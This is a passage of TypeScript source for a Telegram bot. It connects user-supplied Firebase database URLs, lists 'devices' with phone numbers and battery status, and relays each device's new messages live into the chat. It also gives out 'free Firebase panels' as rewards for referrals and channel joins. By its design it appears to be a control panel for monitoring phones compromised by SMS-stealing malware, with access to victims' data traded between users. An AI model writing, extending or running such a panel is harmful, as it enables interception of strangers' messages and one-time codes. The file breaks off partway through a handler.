import { Telegraf, Markup } from "telegraf";
import type { Context } from "telegraf";
import { config } from "./config.js";
import {
  addConnection, adminStats, countConnections, ensureUser, eventSeen, getConnection, getConnections,
  getAdminConnections, getAdminUsers, getDevices, getSetting, getSummary, isBanned, logSystem,
  markConnectionChecked, markEventSeen, pool, removeConnection, replaceDevices, setSetting,
  setUserBanned, ensureSchema, registerReferral, qualifyReferral, getReferralStats,
  addFreeFirebasePanel, getFreeFirebasePanels, removeFreeFirebasePanel, claimFreeFirebase,
  getClaimedFreePanel, addRequiredChannel, getRequiredChannels, removeRequiredChannel
} from "./db.js";
import { collectEvents, extractDevices, readFirebase, validateFirebaseUrl } from "./firebase.js";
import { back, clearSession, getSession, pushScreen, setSession } from "./state.js";
import {
  adminConnectionsKeyboard, adminConnectionsText, adminKeyboard, adminSettingsKeyboard,
  adminSettingsText, adminUserKeyboard, adminUserText, adminUsersKeyboard, adminUsersText,
  connectionKeyboard, firebaseListText, homeKeyboard, homeText, navKeyboard,
  freePanelKeyboard, freePanelText, adminFreeAccessKeyboard, adminFreeAccessText,
  adminReferralKeyboard, adminReferralText, adminFreePoolKeyboard, adminFreePoolText,
  adminChannelsKeyboard, adminChannelsText, adminContentKeyboard, adminContentPrompt,
  adminContentText, DEFAULT_HOW_TO_USE_MESSAGE, DEFAULT_MAINTENANCE_MESSAGE,
  DEFAULT_REFERRAL_MESSAGE
} from "./ui.js";
import type { Device, DeviceSummary, RequiredChannel } from "./types.js";
import { logger } from "../lib/logger.js";

const bot = new Telegraf(config.TELEGRAM_BOT_TOKEN);
type FreshSnapshot = { devices: Device[]; summary: DeviceSummary };
type BatchResult = { url: string; status: "connected" | "failed" | "duplicate" | "skipped"; detail: string; summary?: DeviceSummary };
const scanLocks = new Map<string, Promise<FreshSnapshot>>();
type DeviceMonitor = { active: boolean; timer: ReturnType<typeof setInterval> };
const monitors = new Map<string, DeviceMonitor>();
const answeredCallbacks = new WeakSet<object>();
const MAX_FIREBASE_BATCH = 10;
let botUsername = "";

function userId(ctx: Context): number {
  if (!ctx.from) throw new Error("Missing Telegram user");
  return ctx.from.id;
}

function admin(ctx: Context) {
  return userId(ctx) === config.ADMIN_TELEGRAM_ID;
}

async function answerCallback(ctx: Context, text?: string, extra?: any) {
  if (!("callbackQuery" in ctx) || !ctx.callbackQuery) return;
  if (answeredCallbacks.has(ctx)) {
    if (extra?.show_alert && text) await ctx.reply(text);
    return;
  }
  answeredCallbacks.add(ctx);
  try {
    await ctx.answerCbQuery(text, extra);
  } catch {
    // Telegram may reject callbacks that expired while the process was busy.
  }
}

async function guard(ctx: Context): Promise<boolean> {
  void answerCallback(ctx);
  await ensureUser(ctx);
  const id = userId(ctx);
  if (await isBanned(id)) {
    await ctx.reply("🚫 Your access is currently restricted.");
    return false;
  }
  if ((await getSetting("maintenance_mode", "false")) === "true" && !admin(ctx)) {
    await ctx.reply(await getSetting("maintenance_message", DEFAULT_MAINTENANCE_MESSAGE));
    return false;
  }
  return true;
}

async function editOrReply(ctx: Context, text: string, keyboard?: unknown) {
  if ("callbackQuery" in ctx && ctx.callbackQuery) {
    try {
      await ctx.editMessageText(text, keyboard ? { reply_markup: keyboard as any } : undefined);
      return;
    } catch { /* The message may be unchanged or no longer editable. */ }
  }
  await ctx.reply(text, keyboard ? Markup.inlineKeyboard((keyboard as any).inline_keyboard) : undefined);
}

async function scanConnection(telegramId: number, firebaseId: string): Promise<FreshSnapshot> {
  const connection = await getConnection(telegramId, firebaseId);
  if (!connection) throw new Error("Firebase connection not found");
  const lockKey = `${telegramId}:${firebaseId}`;
  const existing = scanLocks.get(lockKey);
  if (existing) return existing;
  const scan = (async (): Promise<FreshSnapshot> => {
    try {
      const root = await readFirebase(connection.firebaseUrl);
      const devices = extractDevices(root);
      await replaceDevices(firebaseId, devices);
      await markConnectionChecked(firebaseId, "connected");
      return {
        devices,
        summary: {
          total: devices.length,
          online: devices.filter(device => device.status === "online").length,
          offline: devices.filter(device => device.status === "offline").length,
        },
      };
    } catch (error) {
      await markConnectionChecked(firebaseId, "error");
      await logSystem("error", "firebase_scan_failed", error instanceof Error ? error.message : String(error), telegramId);
      throw error;
    }
  })();
  scanLocks.set(lockKey, scan);
  try {
    return await scan;
  } finally {
    if (scanLocks.get(lockKey) === scan) scanLocks.delete(lockKey);
  }
}

async function allSummary(telegramId: number) {
  const connections = await getConnections(telegramId);
  const summaries = new Map<string, DeviceSummary>();
  for (const c of connections) summaries.set(c.id, await getSummary(c.id));
  return { connections, summaries };
}

async function renderHome(ctx: Context) {
  const id = userId(ctx);
  unselectDevice(id);
  clearSession(id);
  const { connections, summaries } = await allSummary(id);
  const devices = [...summaries.values()].reduce((a, s) => ({ total: a.total + s.total, online: a.online + s.online, offline: a.offline + s.offline }), { total: 0, online: 0, offline: 0 });
  const limit = Number(await getSetting("firebase_limit", "10"));
  await editOrReply(ctx, homeText({ connections: connections.length, devices }, limit), homeKeyboard(admin(ctx)));
}

async function renderFirebaseList(ctx: Context) {
  const id = userId(ctx);
  const { connections, summaries } = await allSummary(id);
  const limit = Number(await getSetting("firebase_limit", "10"));
  pushScreen(id, "my_firebase");
  await editOrReply(ctx, firebaseListText(connections, summaries, limit), connectionKeyboard(connections, "firebase"));
}

async function renderDevices(ctx: Context) {
  const id = userId(ctx);
  unselectDevice(id);
  const { connections, summaries } = await allSummary(id);
  if (!connections.length) return editOrReply(ctx, "📱 DEVICES\n\nAdd a Firebase connection first.", navKeyboard());
  if (connections.length > 1) return editOrReply(ctx, "━━━━━━━━━━━━━━━━━━━━\n📱 SELECT FIREBASE\n━━━━━━━━━━━━━━━━━━━━\n\nChoose a Firebase to view live devices.", connectionKeyboard(connections, "devices_firebase"));
  await renderDevicePage(ctx, connections[0].id, 0);
}

async function renderDevicePage(ctx: Context, firebaseId: string, page: number, snapshot?: FreshSnapshot) {
  const id = userId(ctx);
  // Returning to the device list means the previously selected device is no
  // longer selected, so its live message monitor must be stopped.
  unselectDevice(id);
  const connection = await getConnection(id, firebaseId);
  if (!connection) return editOrReply(ctx, "❌ Firebase connection not found.", navKeyboard());
  let fresh = snapshot;
  if (!fresh) {
    try {
      fresh = await scanConnection(id, firebaseId);
    } catch (error) {
      return editOrReply(ctx, `❌ CONNECTION FAILED\n\n${error instanceof Error ? error.message : "Unable to read Firebase data."}`, navKeyboard());
    }
  }
  const devices = fresh.devices;
  const summary = fresh.summary;
  const totalPages = Math.max(1, Math.ceil(devices.length / config.DEVICE_PAGE_SIZE));
  const current = Math.min(Math.max(page, 0), totalPages - 1);
  setSession(id, { screen: "devices", selectedFirebaseId: firebaseId, page: current });
  const slice = devices.slice(current * config.DEVICE_PAGE_SIZE, (current + 1) * config.DEVICE_PAGE_SIZE);
  const lines = ["━━━━━━━━━━━━━━━━━━━━", "📊 LIVE DEVICE STATUS", "━━━━━━━━━━━━━━━━━━━━", "", `🔥 ${connection.displayName}`, "", `📱 Total Devices: ${summary.total}`, `🟢 Online: ${summary.online}`, `🔴 Offline: ${summary.offline}`, "", `Page ${current + 1}/${totalPages}`, "", "Tap a device for authorized details."];
  if (!slice.length) lines.push("", "No recognizable device records were found in this Firebase database.");
  const buttons = slice.map(device => [{
    text: `${device.status === "online" ? "🟢" : "🔴"} ${device.deviceId} | ${device.number ?? "Number unavailable"} | 🔋 ${device.battery !== undefined ? `${device.battery}%` : "Battery unavailable"}`,
    callback_data: `device:${firebaseId}:${encodeURIComponent(device.normalizedDeviceId)}`
  }]);
  const pager = [];
  if (current > 0) pager.push({ text: "⬅️ Previous", callback_data: `page:${firebaseId}:${current - 1}` });
  pager.push({ text: `${current + 1}/${totalPages}`, callback_data: "noop" });
  if (current < totalPages - 1) pager.push({ text: "➡️ Next", callback_data: `page:${firebaseId}:${current + 1}` });
  buttons.push(pager, [{ text: "🔄 Rescan", callback_data: `rescan:${firebaseId}` }], [{ text: "⬅️ Back", callback_data: "back" }, { text: "🏠 Home", callback_data: "home" }]);
  await editOrReply(ctx, lines.join("\n"), { inline_keyboard: buttons });
}

async function animate(ctx: Context, steps: string[]) {
  let messageId: number | undefined;
  if ("callbackQuery" in ctx && ctx.callbackQuery && "message" in ctx.callbackQuery && ctx.callbackQuery.message) messageId = ctx.callbackQuery.message.message_id;
  for (const step of steps) {
    if (messageId) {
      try { await ctx.telegram.editMessageText(ctx.chat!.id, messageId, undefined, step); } catch { /* best effort */ }
    } else {
      const message = await ctx.reply(step);
      messageId = message.message_id;
    }
    await new Promise(resolve => setTimeout(resolve, 450));
  }
}

async function scanAndRender(ctx: Context, firebaseId: string) {
  await animate(ctx, ["⏳ Checking Firebase...", "🔄 Connecting to Firebase...", "📡 Reading database structure...", "🔍 Searching for device records...", "📊 Calculating live device status...", "🔄 Verifying connection..."]);
  try {
    const result = await scanConnection(userId(ctx), firebaseId);
    const page = getSession(userId(ctx)).page;
    await renderDevicePage(ctx, firebaseId, page, result);
  } catch (error) {
    await editOrReply(ctx, `❌ CONNECTION FAILED\n\nThe Firebase database could not be accessed.\n\nReason:\n${error instanceof Error ? error.message : "Connection unavailable"}\n\nPlease check the Firebase URL and authorized access settings.`, { inline_keyboard: [[{ text: "🔄 Try Again", callback_data: `rescan:${firebaseId}` }], [{ text: "🏠 Home", callback_data: "home" }]] });
  }
}

async function connectNewFirebase(ctx: Context, url: string): Promise<string> {
  const root = await readFirebase(url);
  const devices = extractDevices(root);
  const connectionCount = await countConnections(userId(ctx));
  const firebaseId = await addConnection(userId(ctx), url, `Firebase ${connectionCount + 1}`);
  try {
    await replaceDevices(firebaseId, devices);
    await markConnectionChecked(firebaseId, "connected");
    return firebaseId;
  } catch (error) {
    await removeConnection(userId(ctx), firebaseId);
    throw error;
  }
}

function splitFirebaseUrls(text: string): string[] {
  const detected = text.match(/https?:\/\/[^\s,]+/gi) ?? text.split(/[\r\n,]+/);
  return [...new Set(
    detected
      .map(value => value.trim().replace(/[),.;]+$/, ""))
      .filter(Boolean)
  )];
}

function shortError(error: unknown): string {
  const message = error instanceof Error ? error.message : String(error);
  return message.replace(/\s+/g, " ").slice(0, 220);
}

async function updateBatchProgress(ctx: Context, messageId: number, text: string, keyboard?: unknown) {
  try {
    await ctx.telegram.editMessageText(
      ctx.chat!.id,
      messageId,
      undefined,
      text,
      keyboard ? { reply_markup: keyboard as any } : undefined
    );
  } catch {
    // Telegram rejects edits when the text is unchanged; the batch can continue.
  }
}

async function checkRequiredChannels(ctx: Context, channels: RequiredChannel[]) {
  const joined = new Map<string, boolean>();
  for (const channel of channels) {
    try {
      const member = await ctx.telegram.getChatMember(channel.chatId, userId(ctx));
      joined.set(channel.id, ["creator", "administrator", "member"].includes(member.status) || (member.status === "restricted" && member.is_member));
    } catch (error) {
      joined.set(channel.id, false);
      await logSystem("warn", "channel_membership_check_failed", `${channel.chatId}: ${shortError(error)}`, userId(ctx));
    }
  }
  return { joined, allJoined: channels.every(channel => joined.get(channel.id) === true) };
}

async function renderFreePanels(ctx: Context) {
  const id = userId(ctx);
  const channels = await getRequiredChannels();
  const membership = await checkRequiredChannels(ctx, channels);
  if (membership.allJoined) await qualifyReferral(id);
  const [stats, panels, claimed, referralMessage] = await Promise.all([
    getReferralStats(id),
    getFreeFirebasePanels(),
    getClaimedFreePanel(id),
    getSetting("referral_message", DEFAULT_REFERRAL_MESSAGE)
  ]);
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  const available = panels.filter(panel => panel.active && !panel.assignedTo).length;
  const referralLink = botUsername ? `https://t.me/${botUsername}?start=ref_${id}` : undefined;
  const canClaim = membership.allJoined && stats.qualified >= minimum && !stats.claimed && available > 0;
  setSession(id, { screen: "free_panels" });
  await editOrReply(
    ctx,
     freePanelText(stats, minimum, channels, membership.joined, available, referralLink, claimed, referralMessage),
    freePanelKeyboard(channels, referralLink, stats.claimed, canClaim)
  );
}

async function renderAdminFreeAccess(ctx: Context) {
  if (!admin(ctx)) return;
  const [panels, channels] = await Promise.all([getFreeFirebasePanels(), getRequiredChannels()]);
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  await editOrReply(ctx, adminFreeAccessText(minimum, panels, channels), adminFreeAccessKeyboard());
}

async function renderAdminFreePool(ctx: Context) {
  if (!admin(ctx)) return;
  const panels = await getFreeFirebasePanels();
  await editOrReply(ctx, adminFreePoolText(panels), adminFreePoolKeyboard(panels));
}

async function renderAdminChannels(ctx: Context) {
  if (!admin(ctx)) return;
  const channels = await getRequiredChannels();
  await editOrReply(ctx, adminChannelsText(channels), adminChannelsKeyboard(channels));
}

async function renderAdminContent(ctx: Context) {
  if (!admin(ctx)) return;
  const [referralMessage, maintenanceMessage, howToUseMessage] = await Promise.all([
    getSetting("referral_message", DEFAULT_REFERRAL_MESSAGE),
    getSetting("maintenance_message", DEFAULT_MAINTENANCE_MESSAGE),
    getSetting("how_to_use_message", DEFAULT_HOW_TO_USE_MESSAGE)
  ]);
  await editOrReply(
    ctx,
    adminContentText(referralMessage, maintenanceMessage, howToUseMessage),
    adminContentKeyboard()
  );
}

async function registerStartReferral(ctx: Context) {
  if (!ctx.message || !("text" in ctx.message)) return;
  const payload = ctx.message.text.trim().split(/\s+/, 2)[1] ?? "";
  if (!payload.toLowerCase().startsWith("ref_")) return;
  const referrerId = Number(payload.slice(4));
  if (Number.isSafeInteger(referrerId) && referrerId > 0) await registerReferral(userId(ctx), referrerId);
}

async function addFreePoolFromText(ctx: Context, text: string) {
  const parts = text.split("|").map(part => part.trim()).filter(Boolean);
  const rawUrl = parts.length > 1 ? parts[parts.length - 1] : text.trim();
  const panels = await getFreeFirebasePanels();
  const displayName = parts.length > 1
    ? parts.slice(0, -1).join(" | ").slice(0, 120)
    : `Free Firebase ${panels.length + 1}`;
  const url = validateFirebaseUrl(rawUrl);
  await addFreeFirebasePanel(url, displayName);
  await logSystem("info", "free_firebase_added", `${displayName}: ${url}`, userId(ctx));
  setSession(userId(ctx), { awaiting: undefined });
  await ctx.reply(`✅ Free Firebase added to reward pool.\n\n${displayName}\n${url}`);
  await renderAdminFreePool(ctx);
}

async function addChannelFromText(ctx: Context, text: string) {
  const parts = text.split("|").map(part => part.trim()).filter(Boolean);
  const chatId = parts[0];
  if (!chatId || !(/^@[\w\d_]{3,}$/.test(chatId) || /^-?\d+$/.test(chatId))) {
    throw new Error("Send a channel @username or numeric chat ID.");
  }
  const inviteLink = parts[1];
  if (inviteLink && !/^https:\/\/t\.me\//i.test(inviteLink)) {
    throw new Error("Invite link must start with https://t.me/");
  }
  const chat = await ctx.telegram.getChat(chatId);
  const title = ("title" in chat && chat.title)
    || ("username" in chat && chat.username ? `@${chat.username}` : chatId);
  await addRequiredChannel(chatId, title, inviteLink);
  await logSystem("info", "required_channel_added", `${title} (${chatId})`, userId(ctx));
  setSession(userId(ctx), { awaiting: undefined });
  await ctx.reply(`✅ Required channel added.\n\n${title}\n${chatId}`);
  await renderAdminChannels(ctx);
}

async function addFirebaseBatch(ctx: Context, rawText: string) {
  const id = userId(ctx);
  const inputUrls = splitFirebaseUrls(rawText);
  const limit = Number(await getSetting("firebase_limit", "10"));
  const existingConnections = await getConnections(id);
  const remaining = Math.max(0, limit - existingConnections.length);
  const results: BatchResult[] = [];
  const urlsToCheck = inputUrls.slice(0, MAX_FIREBASE_BATCH);
  const progress = await ctx.reply(`⏳ Preparing Firebase checks...\n\nFound ${inputUrls.length} URL${inputUrls.length === 1 ? "" : "s"}.\nChecking one-by-one...`);

  if (!inputUrls.length) {
    await updateBatchProgress(ctx, progress.message_id, "❌ No Firebase URLs found.\n\nSend one URL per line, or separate URLs with commas.");
    return;
  }

  let added = 0;
  for (let index = 0; index < urlsToCheck.length; index++) {
    const rawUrl = urlsToCheck[index];
    const displayUrl = rawUrl.length > 90 ? `${rawUrl.slice(0, 87)}...` : rawUrl;
    await updateBatchProgress(ctx, progress.message_id, `🔄 Checking Firebase ${index + 1}/${urlsToCheck.length}\n\n${displayUrl}\n\nThis URL is being verified now...`);
    if (added >= remaining) {
      results.push({ url: rawUrl, status: "skipped", detail: `Connection limit reached (${limit})` });
      continue;
    }

    try {
      const url = validateFirebaseUrl(rawUrl);
      if (existingConnections.some(connection => connection.firebaseUrl === url)) {
        results.push({ url, status: "duplicate", detail: "Already connected" });
        continue;
      }
      const firebaseId = await connectNewFirebase(ctx, url);
      const summary = await getSummary(firebaseId);
      existingConnections.push({
        id: firebaseId,
        telegramId: id,
        firebaseUrl: url,
        displayName: `Firebase ${existingConnections.length + 1}`,
        status: "connected",
        addedAt: new Date().toISOString()
      });
      added++;
      results.push({ url, status: "connected", detail: "Connected successfully", summary });
    } catch (error) {
      results.push({ url: rawUrl, status: "failed", detail: shortError(error) });
    }
  }
  if (inputUrls.length > MAX_FIREBASE_BATCH) {
    results.push(...inputUrls.slice(MAX_FIREBASE_BATCH).map(url => ({
      url,
      status: "skipped" as const,
      detail: `Batch limit is ${MAX_FIREBASE_BATCH} URLs`
    })));
  }

  setSession(id, { awaiting: undefined });
  const { connections, summaries } = await allSummary(id);
  const totals = [...summaries.values()].reduce(
    (acc, summary) => ({
      total: acc.total + summary.total,
      online: acc.online + summary.online,
      offline: acc.offline + summary.offline,
    }),
    { total: 0, online: 0, offline: 0 }
  );
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "📊 FIREBASE BATCH RESULT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    ...results.map((result, index) => {
      const label = result.status === "connected" ? "✅ CONNECTED"
        : result.status === "duplicate" ? "↩️ DUPLICATE"
          : result.status === "skipped" ? "⏭ SKIPPED"
            : "❌ DEAD / FAILED";
      const deviceSummary = result.summary
        ? `\n   Devices: ${result.summary.total} · Online: ${result.summary.online} · Offline: ${result.summary.offline}`
        : "";
      return `${index + 1}. ${label}\n   ${result.url}\n   ${result.detail}${deviceSummary}`;
    }),
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    "📈 TOTAL ACCOUNT SUMMARY",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `🔥 Firebase Added This Round: ${added}`,
    `🗂 Total Firebase Connections: ${connections.length}/${limit}`,
    `📱 Total Devices: ${totals.total}`,
    `🟢 Total Online: ${totals.online}`,
    `🔴 Total Offline: ${totals.offline}`,
    "",
    `✅ Connected: ${results.filter(result => result.status === "connected").length}`,
    `❌ Dead / Failed: ${results.filter(result => result.status === "failed").length}`,
    `↩️ Duplicate: ${results.filter(result => result.status === "duplicate").length}`,
    `⏭ Skipped: ${results.filter(result => result.status === "skipped").length}`,
  ];
  await updateBatchProgress(ctx, progress.message_id, lines.join("\n").slice(0, 3900), homeKeyboard(admin(ctx)));
}

bot.start(async ctx => {
  unselectDevice(userId(ctx));
  if (await guard(ctx)) {
    await registerStartReferral(ctx);
    await renderHome(ctx);
  }
});
bot.command("cancel", async ctx => { clearSession(userId(ctx)); await ctx.reply("✅ Cancelled.", homeKeyboard(admin(ctx)) as any); });
bot.command("myid", async ctx => { await ctx.reply(`🆔 Your Telegram ID is:\n${userId(ctx)}\n\nUse this numeric ID as ADMIN_TELEGRAM_ID for admin access.`); });

bot.on("text", async (ctx, next) => {
  if (!(await guard(ctx))) return;
  if (ctx.message.text.trim().startsWith("/")) return next();
  const session = getSession(userId(ctx));
  if (session.awaiting === "firebase_url") {
    try {
      await addFirebaseBatch(ctx, ctx.message.text);
    } catch (error) {
      setSession(userId(ctx), { awaiting: undefined });
      await logSystem("warn", "firebase_batch_failed", error instanceof Error ? error.message : String(error), userId(ctx));
      await ctx.reply(`❌ Firebase batch check failed.\n\n${shortError(error)}\n\nSend /start to try again.`);
    }
    return;
  }
  if (session.awaiting === "free_firebase_url" && admin(ctx)) {
    try {
      await addFreePoolFromText(ctx, ctx.message.text);
    } catch (error) {
      await ctx.reply(`❌ Could not add free Firebase.\n\n${shortError(error)}\n\nFormat: Optional Name | https://your-project.firebaseio.com`);
    }
    return;
  }
  if (session.awaiting === "required_channel" && admin(ctx)) {
    try {
      await addChannelFromText(ctx, ctx.message.text);
    } catch (error) {
      await ctx.reply(`❌ Could not add required channel.\n\n${shortError(error)}\n\nFormat: @channelusername | https://t.me/channelusername`);
    }
    return;
  }
  if (session.awaiting === "referral_minimum" && admin(ctx)) {
    const minimum = Number(ctx.message.text.trim());
    if (!Number.isInteger(minimum) || minimum < 0 || minimum > 1000) {
      await ctx.reply("❌ Minimum referrals must be a whole number from 0 to 1000.");
      return;
    }
    await setSetting("minimum_referrals", String(minimum));
    setSession(userId(ctx), { awaiting: undefined });
    await logSystem("info", "minimum_referrals_changed", `Minimum qualified referrals set to ${minimum}`, userId(ctx));
    await ctx.reply(`✅ Minimum qualified referrals set to ${minimum}.`);
    await renderAdminFreeAccess(ctx);
    return;
  }
  if (
    (session.awaiting === "referral_message" ||
      session.awaiting === "maintenance_message" ||
      session.awaiting === "how_to_use_message") &&
    admin(ctx)
  ) {
    const value = ctx.message.text.trim().slice(0, 3900);
    if (!value) {
      await ctx.reply("❌ Message cannot be empty. Send the text again or use /cancel.");
      return;
    }
    const key = session.awaiting === "referral_message"
      ? "referral_message"
      : session.awaiting === "maintenance_message"
        ? "maintenance_message"
        : "how_to_use_message";
    const label = session.awaiting === "referral_message"
      ? "Referral"
      : session.awaiting === "maintenance_message"
        ? "Maintenance"
        : "How to Use";
    await setSetting(key, value);
    setSession(userId(ctx), { awaiting: undefined });
    await logSystem("info", "bot_content_changed", `${label} message updated`, userId(ctx));
    await ctx.reply(`✅ ${label} message saved.`);
    await renderAdminContent(ctx);
    return;
  }
  if (session.awaiting === "broadcast" && admin(ctx)) {
    setSession(userId(ctx), { awaiting: undefined });
    const users = await (await import("./db.js")).query<{ telegram_id: string }>("SELECT telegram_id FROM users WHERE is_banned = false", []);
    setSession(userId(ctx), { screen: "broadcast_preview" });
    await ctx.reply(`━━━━━━━━━━━━━━━━━━━━\n📢 BROADCAST PREVIEW\n━━━━━━━━━━━━━━━━━━━━\n\nRecipients: ${users.length} Users\n\n${ctx.message.text}`, Markup.inlineKeyboard([[Markup.button.callback("✅ Send", `broadcast_send:${Buffer.from(ctx.message.text).toString("base64url")}`), Markup.button.callback("❌ Cancel", "admin")]]));
    return;
  }
  return next();
});

bot.action("noop", async ctx => answerCallback(ctx));
bot.action("home", async ctx => { unselectDevice(userId(ctx)); if (await guard(ctx)) { await answerCallback(ctx); await renderHome(ctx); } });
bot.action("free_panels", async ctx => {
  if (await guard(ctx)) {
    await answerCallback(ctx);
    await renderFreePanels(ctx);
  }
});
bot.action("claim_free_firebase", async ctx => {
  if (!(await guard(ctx))) return;
  const channels = await getRequiredChannels();
  const membership = await checkRequiredChannels(ctx, channels);
  if (!membership.allJoined) {
    await answerCallback(ctx, "Join every required channel first.", { show_alert: true });
    await renderFreePanels(ctx);
    return;
  }
  await qualifyReferral(userId(ctx));
  const stats = await getReferralStats(userId(ctx));
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  if (stats.qualified < minimum) {
    await answerCallback(ctx, `Need ${minimum - stats.qualified} more qualified referral(s).`, { show_alert: true });
    return;
  }
  const panel = await claimFreeFirebase(userId(ctx));
  if (!panel) {
    await answerCallback(ctx, "No free Firebase is available right now.", { show_alert: true });
    await renderFreePanels(ctx);
    return;
  }
  const connection = (await getConnections(userId(ctx))).find(item => item.firebaseUrl === panel.firebaseUrl);
  if (connection) {
    try {
      await scanConnection(userId(ctx), connection.id);
    } catch (error) {
      await logSystem("warn", "free_firebase_initial_scan_failed", shortError(error), userId(ctx));
    }
  }
  await answerCallback(ctx, "Free Firebase claimed!");
  await renderFreePanels(ctx);
});
bot.action(["help", "how_to_use"], async ctx => {
  await answerCallback(ctx);
  await editOrReply(ctx, await getSetting("how_to_use_message", DEFAULT_HOW_TO_USE_MESSAGE), navKeyboard());
});
bot.action("add_firebase", async ctx => {
  if (!(await guard(ctx))) return;
  const limit = Number(await getSetting("firebase_limit", "10"));
  const current = await countConnections(userId(ctx));
  if (current >= limit) return editOrReply(ctx, `⚠️ Firebase Limit Reached\n\nYou currently have ${current}/${limit} Firebase connections.\n\nRemove an existing Firebase before adding another one.`, { inline_keyboard: [[{ text: "🗂 Manage Firebase", callback_data: "my_firebase" }], [{ text: "🏠 Home", callback_data: "home" }]] });
  setSession(userId(ctx), { awaiting: "firebase_url", screen: "add_firebase" });
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n➕ ADD FIREBASE\n━━━━━━━━━━━━━━━━━━━━\n\nSend up to ${Math.min(10, limit - current)} Firebase URLs in one message.\nUse one URL per line or separate them with commas.\n\nExample:\nhttps://project-one-default-rtdb.firebaseio.com\nhttps://project-two-default-rtdb.firebaseio.com\n\nEach URL will be checked one-by-one. Dead URLs will be reported separately.\n\nSend /cancel to stop.`, { inline_keyboard: [[{ text: "⬅️ Back to Home", callback_data: "home" }]] });
});
bot.action("my_firebase", async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderFirebaseList(ctx); } });
bot.action("devices", async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderDevices(ctx); } });
bot.action(/^devices_firebase:(.+)$/, async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderDevicePage(ctx, ctx.match[1], 0); } });
bot.action(/^firebase:(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const connection = await getConnection(userId(ctx), ctx.match[1]);
  if (!connection) {
    await answerCallback(ctx, "Not found", { show_alert: true });
    return;
  }
  let summary: DeviceSummary;
  try {
    summary = (await scanConnection(userId(ctx), connection.id)).summary;
  } catch {
    summary = { total: 0, online: 0, offline: 0 };
  }
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n🔥 ${connection.displayName}\n━━━━━━━━━━━━━━━━━━━━\n\n🟢 Status: ${connection.status}\n\n📱 Total Devices: ${summary.total}\n🟢 Online: ${summary.online}\n🔴 Offline: ${summary.offline}\n\n🕒 Last Updated: ${connection.lastChecked ?? "Not checked"}`, { inline_keyboard: [[{ text: "📱 View Devices", callback_data: `devices_firebase:${connection.id}` }, { text: "🔄 Rescan Firebase", callback_data: `rescan:${connection.id}` }], [{ text: "🗑 Remove Firebase", callback_data: `remove:${connection.id}` }], [{ text: "⬅️ Back", callback_data: "my_firebase" }, { text: "🏠 Home", callback_data: "home" }]] });
});
bot.action(/^page:([^:]+):(\d+)$/, async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderDevicePage(ctx, ctx.match[1], Number(ctx.match[2])); } });
bot.action(/^rescan:(.+)$/, async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await scanAndRender(ctx, ctx.match[1]); } });
bot.action(/^remove:(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const connection = await getConnection(userId(ctx), ctx.match[1]);
  if (!connection) {
    await answerCallback(ctx, "Not found", { show_alert: true });
    return;
  }
  await removeConnection(userId(ctx), connection.id);
  stopMonitorsFor(connection.id);
  await answerCallback(ctx, "Firebase removed");
  await renderFirebaseList(ctx);
});
bot.action(/^device:([^:]+):(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const firebaseId = ctx.match[1];
  const normalized = decodeURIComponent(ctx.match[2]);
  const [connection, cachedDevices] = await Promise.all([
    getConnection(userId(ctx), firebaseId),
    getDevices(firebaseId),
  ]);
  let device = cachedDevices.find(d => d.normalizedDeviceId === normalized);
  if (!connection) {
    await answerCallback(ctx, "Firebase not found", { show_alert: true });
    return;
  }
  if (!device) {
    try {
      const fresh = await scanConnection(userId(ctx), firebaseId);
      device = fresh.devices.find(d => d.normalizedDeviceId === normalized);
    } catch (error) {
      await answerCallback(ctx, "Unable to refresh device", { show_alert: true });
      await editOrReply(ctx, `❌ CONNECTION FAILED\n\n${error instanceof Error ? error.message : "Unable to read Firebase data."}`, navKeyboard());
      return;
    }
  }
  if (!device) {
    await answerCallback(ctx, "Device not found", { show_alert: true });
    return;
  }
  unselectDevice(userId(ctx));
  setSession(userId(ctx), { selectedFirebaseId: firebaseId, selectedDeviceId: normalized, screen: "device_detail" });
  startMonitor(userId(ctx), firebaseId, device);
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n📱 DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━━━\n\n${device.status === "online" ? "🟢" : "🔴"} Status: ${device.status === "online" ? "Online" : "Offline"}\n\n🆔 Device ID:\n${device.deviceId}\n\n📞 Number:\n${device.number ?? "Number unavailable"}\n\n🔋 Battery:\n${device.battery !== undefined ? `${device.battery}%` : "Battery unavailable"}\n\n🕒 Last Seen:\n${device.lastSeen ?? "Last seen unavailable"}\n\n📡 New messages for this selected device will be sent here automatically.\n\n━━━━━━━━━━━━━━━━━━━━`, { inline_keyboard: [[{ text: "📡 Live Messages", callback_data: `events:${firebaseId}:${encodeURIComponent(normalized)}` }, { text: "🔄 Refresh Device", callback_data: `rescan:${firebaseId}` }], [{ text: "🚫 Unselect Number", callback_data: "unselect_device" }], [{ text: "⬅️ Back", callback_data: `devices_firebase:${firebaseId}` }, { text: "🏠 Home", callback_data: "home" }]] });
});
bot.action(/^events:([^:]+):(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const firebaseId = ctx.match[1], normalized = decodeURIComponent(ctx.match[2]);
  let fresh: FreshSnapshot;
  try {
    fresh = await scanConnection(userId(ctx), firebaseId);
  } catch (error) {
    await answerCallback(ctx, "Unable to refresh device", { show_alert: true });
    await editOrReply(ctx, `❌ CONNECTION FAILED\n\n${error instanceof Error ? error.message : "Unable to read Firebase data."}`, navKeyboard());
    return;
  }
  const device = fresh.devices.find(d => d.normalizedDeviceId === normalized);
  if (!device) {
    await answerCallback(ctx, "Device not found", { show_alert: true });
    return;
  }
  startMonitor(userId(ctx), firebaseId, device);
